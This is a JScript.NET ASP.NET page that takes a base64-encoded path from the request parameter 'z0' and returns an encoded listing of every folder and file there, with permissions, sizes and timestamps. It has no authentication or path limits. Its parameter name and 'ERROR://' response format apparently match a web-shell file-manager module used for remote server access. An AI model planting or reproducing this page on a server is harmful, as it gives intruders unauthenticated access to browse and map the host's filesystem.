<%

function GetCurrentCharset() : String {
    var charset : String = System.Web.HttpContext.Current.Response.Charset;
    
    if (charset == null || charset == "") {
        switch (System.Web.HttpContext.Current.Session.CodePage) {
            case 65001: charset = "utf-8"; break;
            case 1252:  charset = "windows-1252"; break;
            case 936:   charset = "gb2312"; break;
            case 950:   charset = "big5"; break;
            case 1251:  charset = "windows-1251"; break;
            default:    charset = "utf-8"; break;
        }
    }
    return charset;
}

function Base64Decode(str : String) : String {
    try {
        var encBytes : Byte[] = System.Convert.FromBase64String(str);
        var encoding : System.Text.Encoding = System.Text.Encoding.GetEncoding(GetCurrentCharset());
        return encoding.GetString(encBytes);
    } catch(e) {
        return "";
    }
}

function Base64Encode(str : String) : String {
    try {
        var encoding : System.Text.Encoding = System.Text.Encoding.GetEncoding(GetCurrentCharset());
        var plainBytes : Byte[] = encoding.GetBytes(str);
        return System.Convert.ToBase64String(plainBytes);
    } catch(e) {
        return "";
    }
}

function fnDatetimeConversion(dt : System.DateTime) : String {
    return dt.ToString("yyyy-MM-dd HH:mm:ss");
}

function fnPermission(info : System.IO.FileSystemInfo) : String {
    var p : String = "Read";
    var attrs : System.IO.FileAttributes = info.Attributes;

    if ((attrs & System.IO.FileAttributes.ReadOnly) == System.IO.FileAttributes.ReadOnly) {
        p = "Read";
    } else {
        p += ",Write";
    }

    if (info instanceof System.IO.FileInfo) {
        var ext : String = info.Extension.toLowerCase();
        if (ext == ".exe" || ext == ".bat" || ext == ".cmd") {
            p += ",Execute";
        }
    }
    return p;
}

var b64Dir : String = System.Web.HttpContext.Current.Request.Item["z0"];
if (b64Dir == null || b64Dir == "") {
    Response.Write("ERROR://Missing directory parameter (z0)");
} else {
    var szDir : String = Base64Decode(b64Dir);
    szDir = szDir.replace(/\//g, "\\");

    if (!System.IO.Directory.Exists(szDir)) {
        Response.Write("ERROR://Unable to open directory");
        Response.Write(szDir);
    } else {
        var dirInfo : System.IO.DirectoryInfo = new System.IO.DirectoryInfo(szDir);
        var aResult : System.Text.StringBuilder = new System.Text.StringBuilder();

        var szb64Name : String = "";
        var szPerm : String = "";
        var nLength : long = 0;
        var ctime : String = "";
        var mtime : String = "";
        var atime : String = "";

        var subFolders : System.IO.DirectoryInfo[] = dirInfo.GetDirectories();
        for (var i = 0; i < subFolders.Length; i++) {
            var subFolder : System.IO.DirectoryInfo = subFolders[i];
            
            szb64Name = Base64Encode("/" + subFolder.Name);
            szPerm = fnPermission(subFolder);
            nLength = 0;
            ctime = fnDatetimeConversion(subFolder.CreationTime);
            mtime = fnDatetimeConversion(subFolder.LastWriteTime);
            atime = fnDatetimeConversion(subFolder.LastAccessTime);

            if (aResult.Length > 0) aResult.Append("|");
            aResult.Append(szb64Name + "?" + szPerm + "?" + nLength + "?" + ctime + "?" + mtime + "?" + atime);
        }

        var files : System.IO.FileInfo[] = dirInfo.GetFiles();
        for (var j = 0; j < files.Length; j++) {
            var file : System.IO.FileInfo = files[j];
            
            szb64Name = Base64Encode(file.Name);
            szPerm = fnPermission(file);
            nLength = file.Length;
            ctime = fnDatetimeConversion(file.CreationTime);
            mtime = fnDatetimeConversion(file.LastWriteTime);
            atime = fnDatetimeConversion(file.LastAccessTime);

            if (aResult.Length > 0) aResult.Append("|");
            aResult.Append(szb64Name + "?" + szPerm + "?" + nLength + "?" + ctime + "?" + mtime + "?" + atime);
        }

        Response.Write(aResult.ToString());
    }
}

%>